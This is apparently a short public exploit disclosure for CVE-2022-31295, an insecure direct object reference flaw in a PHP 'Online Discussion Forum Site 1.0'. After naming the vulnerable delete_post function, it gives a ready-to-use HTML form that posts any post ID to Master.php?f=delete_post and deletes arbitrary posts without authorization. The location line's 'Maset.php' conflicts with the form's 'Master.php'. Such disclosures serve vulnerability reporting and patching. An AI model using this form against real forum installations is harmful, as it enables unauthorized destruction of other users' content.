# CVE-2022-31295

Online Discussion Forum Site 1.0 - IDOR / Delete any post

#### Exploit Title: Online Discussion Forum Site 1.0 - IDOR / Delete any post
#### Date: 2022-06-13
#### CVE: CVE-2022-31295
#### Exploit Author: Abdulaziz Saad (@b4zb0z)
#### Vendor Homepage: https://www.sourcecodester.com/
#### Software Link: https://www.sourcecodester.com/php/15337/online-discussion-forum-site-phpoop-free-source-code.html
#### Version: 1.0
#### Tested on: LAMP, Ubuntu

-----


[#] Vulnerability Location:
	`function delete_post()` in `/odfs/classes/Maset.php:133`

----

[#] Exploitation:
	```
	 <form action="http://localhost/odfs/classes/Master.php?f=delete_post" method="post" id="manage-user">	
				<input type="text" name="id" value="" placeholder="enter POST ID to delete" required>
                <button type="submit">Delete Post</button>
	</form>
	```
